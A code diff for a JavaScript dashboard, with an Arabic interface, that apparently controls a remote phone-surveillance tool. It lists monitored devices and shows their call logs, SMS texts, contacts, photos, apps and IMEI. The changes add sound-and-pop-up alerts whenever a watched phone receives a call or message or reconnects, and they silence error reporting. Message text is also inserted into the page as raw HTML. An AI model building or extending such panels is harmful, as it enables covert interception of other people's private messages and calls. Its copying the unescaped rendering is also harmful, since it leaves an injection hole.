@@ -12,10 +12,98 @@ let allContacts = [];
 let currentChat = null;
 let currentCallNumber = null;
 let currentContact = null;
+let wasOffline = true;
+let lastCallCount = 0;
+let lastSmsCount = 0;
+let notificationShown = false;
 
 function logout() {
     sessionStorage.removeItem('logged_in');
     window.location.href = 'login.html';
+}
+
+// ✅ تشغيل الصوت
+function playNotificationSound() {
+    try {
+        const audio = new Audio('v.wav');
+        audio.volume = 1.0;
+        audio.play();
+    } catch (e) {}
+}
+
+// ✅ البحث عن اسم جهة الاتصال
+function findContactName(number) {
+    if (!allContacts || allContacts.length === 0 || !number) return null;
+    const cleanNumber = number.replace(/[^0-9]/g, '').slice(-9);
+    
+    for (let contact of allContacts) {
+        const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
+        for (let n of numbers) {
+            if (!n) continue;
+            const cleanN = n.replace(/[^0-9]/g, '').slice(-9);
+            if (cleanN === cleanNumber) return contact.name;
+        }
+    }
+    return null;
+}
+
+// ✅ عرض الإشعار
+function showNotification(title, message, icon) {
+    const notificationDiv = document.createElement('div');
+    notificationDiv.className = 'notification-popup';
+    notificationDiv.innerHTML = `
+        <div class="notification-icon">${icon}</div>
+        <div class="notification-content">
+            <div class="notification-title">${title}</div>
+            <div class="notification-message">${message}</div>
+        </div>
+        <button class="notification-close" onclick="this.parentElement.remove()">✕</button>
+    `;
+    
+    document.body.appendChild(notificationDiv);
+    playNotificationSound();
+    
+    setTimeout(() => {
+        if (notificationDiv.parentElement) notificationDiv.remove();
+    }, 5000);
+}
+
+// ✅ فحص المكالمات الجديدة
+function checkNewCalls(newCalls) {
+    if (!newCalls || newCalls.length === 0) return;
+    
+    if (lastCallCount > 0 && newCalls.length > lastCallCount) {
+        const newCall = newCalls[0];
+        const contactName = findContactName(newCall.number);
+        const displayName = contactName || newCall.number || 'غير معروف';
+        
+        showNotification('📞 مكالمة جديدة', `${displayName} — ${getCallType(newCall.type)}`, '📞');
+    }
+    lastCallCount = newCalls.length;
+}
+
+// ✅ فحص الرسائل الجديدة
+function checkNewSMS(newSMS) {
+    if (!newSMS || newSMS.length === 0) return;
+    
+    if (lastSmsCount > 0 && newSMS.length > lastSmsCount) {
+        const newSMSItem = newSMS[0];
+        const contactName = findContactName(newSMSItem.address);
+        const displayName = contactName || newSMSItem.address || 'غير معروف';
+        
+        showNotification('💬 رسالة جديدة', `${displayName}: ${newSMSItem.body || ''}`, '💬');
+    }
+    lastSmsCount = newSMS.length;
+}
+
+// ✅ إشعار عند اتصال الجهاز
+function checkDeviceReconnect(data) {
+    if (data.online && wasOffline && !notificationShown) {
+        notificationShown = true;
+        showNotification('✅ الجهاز متصل', 'عاد الجهاز للاتصال بالإنترنت', '🔌');
+        setTimeout(() => { notificationShown = false; }, 10000);
+    }
+    wasOffline = data.online;
 }
 
 // حذف الجهاز
@@ -29,9 +117,7 @@ async function deleteDevice() {
         loadDevices();
         currentDevice = null;
         document.getElementById('deviceSelect').value = '';
-    } catch (e) {
-        alert('خطأ في الحذف');
-    }
+    } catch (e) {}
 }
 
 // تحميل الأجهزة
@@ -51,26 +137,19 @@ async function loadDevices() {
             select.appendChild(option);
         });
         
-        if (currentValue) {
-            select.value = currentValue;
-        }
-    } catch (e) {
-        console.error('Devices error:', e);
-    }
+        if (currentValue) select.value = currentValue;
+    } catch (e) {}
 }
 
 function selectDevice(deviceId) {
     currentDevice = deviceId;
-    
     if (updateInterval) clearInterval(updateInterval);
     if (dataInterval) clearInterval(dataInterval);
     
     if (deviceId) {
         updateInterval = setInterval(updateLiveData, 3000);
         dataInterval = setInterval(() => {
-            if (currentDevice) {
-                loadAllData();
-            }
+            if (currentDevice) loadAllData();
         }, 5000);
         
         updateLiveData();
@@ -78,12 +157,16 @@ function selectDevice(deviceId) {
     }
 }
 
+// ✅ تحديث الحالة الحية مع إشعار الاتصال
 async function updateLiveData() {
     if (!currentDevice) return;
     
     try {
         const response = await fetch(`/live.php?device=${currentDevice}`);
         const data = await response.json();
+        
+        // إشعار عند اتصال الجهاز
+        checkDeviceReconnect(data);
         
         const statusEl = document.getElementById('networkStatus');
         if (data.online) {
@@ -123,9 +206,7 @@ async function updateLiveData() {
         if (data.apps_count !== undefined) 
             document.getElementById('appsCount').textContent = `(${data.apps_count})`;
         
-    } catch (e) {
-        console.error('Live error:', e);
-    }
+    } catch (e) {}
 }
 
 async function loadAllData() {
@@ -145,12 +226,12 @@ async function loadCalls() {
         const newCalls = await response.json();
         
         if (JSON.stringify(newCalls) !== JSON.stringify(allCalls)) {
+            // ✅ فحص المكالمات الجديدة
+            checkNewCalls(newCalls);
+            
             allCalls = newCalls;
-            if (currentCallNumber) {
-                openCallDetail(currentCallNumber);
-            } else {
-                displayCallsList();
-            }
+            if (currentCallNumber) openCallDetail(currentCallNumber);
+            else displayCallsList();
         }
     } catch (e) {}
 }
@@ -170,39 +251,41 @@ function displayCallsList() {
     
     const sortedCalls = [...allCalls].sort((a, b) => (b.date || 0) - (a.date || 0));
     
-    const callGroups = {};
     sortedCalls.forEach(call => {
-        const number = call.number || 'غير معروف';
-        if (!callGroups[number]) callGroups[number] = [];
-        callGroups[number].push(call);
-    });
-    
-    Object.keys(callGroups).forEach(number => {
-        const calls = callGroups[number];
-        const lastCall = calls[0];
+        const contactName = findContactName(call.number);
+        const displayName = call.name || contactName || call.number || 'غير معروف';
         
         const div = document.createElement('div');
         div.className = 'conversation-item';
-        div.onclick = () => openCallDetail(number);
+        div.onclick = () => openCallDetail(call.number);
         div.innerHTML = `
-            <div class="conversation-avatar">📞</div>
+            <div class="conversation-avatar">${getCallIcon(call.type)}</div>
             <div class="conversation-info">
-                <div class="conversation-name">${lastCall.name || number}</div>
-                <div class="conversation-preview">
-                    ${getCallType(lastCall.type)} • ${formatDuration(lastCall.duration)} • ${formatDate(lastCall.date)}
-                </div>
+                <div class="conversation-name">${displayName}</div>
+                <div class="conversation-preview">${formatDate(call.date)}</div>
             </div>
-            <div class="conversation-count">${calls.length} مكالمة</div>
+            <div class="conversation-time">${formatDuration(call.duration)}</div>
         `;
         listDiv.appendChild(div);
     });
+}
+
+function getCallIcon(type) {
+    switch(parseInt(type)) {
+        case 1: return '📥';
+        case 2: return '📤';
+        case 3: return '❌';
+        default: return '📞';
+    }
 }
 
 function openCallDetail(number) {
     currentCallNumber = number;
     document.getElementById('callsListView').style.display = 'none';
     document.getElementById('callDetailView').style.display = 'block';
-    document.getElementById('callDetailTitle').textContent = `📞 ${number}`;
+    
+    const contactName = findContactName(number);
+    document.getElementById('callDetailTitle').textContent = `📞 ${contactName || number}`;
     
     const detailsDiv = document.getElementById('callDetailsList');
     detailsDiv.innerHTML = '';
@@ -235,12 +318,12 @@ async function loadSMS() {
         const newSMS = await response.json();
         
         if (JSON.stringify(newSMS) !== JSON.stringify(allSMS)) {
+            // ✅ فحص الرسائل الجديدة
+            checkNewSMS(newSMS);
+            
             allSMS = newSMS;
-            if (currentChat) {
-                openChat(currentChat);
-            } else {
-                displayConversations();
-            }
+            if (currentChat) openChat(currentChat);
+            else displayConversations();
         }
     } catch (e) {}
 }
@@ -270,6 +353,8 @@ function displayConversations() {
     Object.keys(conversations).forEach(number => {
         const messages = conversations[number];
         const lastMessage = messages[0];
+        const contactName = findContactName(number);
+        const displayName = contactName || number;
         
         const div = document.createElement('div');
         div.className = 'conversation-item';
@@ -277,7 +362,7 @@ function displayConversations() {
         div.innerHTML = `
             <div class="conversation-avatar">💬</div>
             <div class="conversation-info">
-                <div class="conversation-name">${number}</div>
+                <div class="conversation-name">${displayName}</div>
                 <div class="conversation-preview">${lastMessage.body || ''}</div>
             </div>
             <div class="conversation-time">${formatDate(lastMessage.date)}</div>
@@ -290,7 +375,9 @@ function openChat(number) {
     currentChat = number;
     document.getElementById('conversationsList').style.display = 'none';
     document.getElementById('chatView').style.display = 'block';
-    document.getElementById('chatTitle').textContent = `💬 ${number}`;
+    
+    const contactName = findContactName(number);
+    document.getElementById('chatTitle').textContent = `💬 ${contactName || number}`;
     
     const messagesList = document.getElementById('messagesList');
     messagesList.innerHTML = '';
@@ -327,11 +414,8 @@ async function loadContacts() {
         
         if (JSON.stringify(newContacts) !== JSON.stringify(allContacts)) {
             allContacts = newContacts;
-            if (currentContact) {
-                openContactDetail(currentContact);
-            } else {
-                displayContactsList();
-            }
+            if (currentContact) openContactDetail(currentContact);
+            else displayContactsList();
         }
     } catch (e) {}
 }
@@ -416,7 +500,7 @@ async function loadImages() {
         grid.innerHTML = '';
         
         if (!images || images.length === 0) {
-            grid.innerHTML = '<p style="color:#888;text-align:center;">لا توجد صور</p>';
+            grid.innerHTML = '<p style="color:#888;">لا توجد صور</p>';
             return;
         }
         
@@ -450,9 +534,7 @@ async function loadImages() {
             const viewBtn = document.createElement('button');
             viewBtn.className = 'view-btn';
             viewBtn.textContent = '👁️ عرض';
-            viewBtn.onclick = () => {
-                window.open(img.src, '_blank');
-            };
+            viewBtn.onclick = () => window.open(img.src, '_blank');
             
             const downloadBtn = document.createElement('button');
             downloadBtn.className = 'download-btn';
@@ -474,9 +556,7 @@ async function loadImages() {
             div.appendChild(buttonsDiv);
             grid.appendChild(div);
         });
-    } catch (e) {
-        console.error('Images error:', e);
-    }
+    } catch (e) {}
 }
 
 // ============ التطبيقات ============
@@ -525,8 +605,6 @@ async function loadDeviceInfo() {
                 <div class="info-card"><span>النظام:</span><strong>${info.os_version || '—'}</strong></div>
                 <div class="info-card"><span>IMEI:</span><strong>${info.imei || '—'}</strong></div>
                 <div class="info-card"><span>الناقل:</span><strong>${info.carrier || '—'}</strong></div>
-                <div class="info-card"><span>الذاكرة:</span><strong>${formatBytes(info.total_ram)}</strong></div>
-                <div class="info-card"><span>المساحة الحرة:</span><strong>${formatBytes(info.free_storage)}</strong></div>
             </div>
         `;
     } catch (e) {}
@@ -565,14 +643,6 @@ function formatDate(timestamp) {
     try { return new Date(timestamp).toLocaleString('ar'); } catch (e) { return '—'; }
 }
 
-function formatBytes(bytes) {
-    if (!bytes || bytes === 0) return '0 Bytes';
-    const k = 1024;
-    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
-    const i = Math.floor(Math.log(bytes) / Math.log(k));
-    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-}
-
 function getCallType(type) {
     switch(parseInt(type)) {
         case 1: return '📥 وارد';
@@ -582,6 +652,5 @@ function getCallType(type) {
     }
 }
 
-// تحميل الأجهزة عند الفتح
 loadDevices();
 setInterval(loadDevices, 10000);
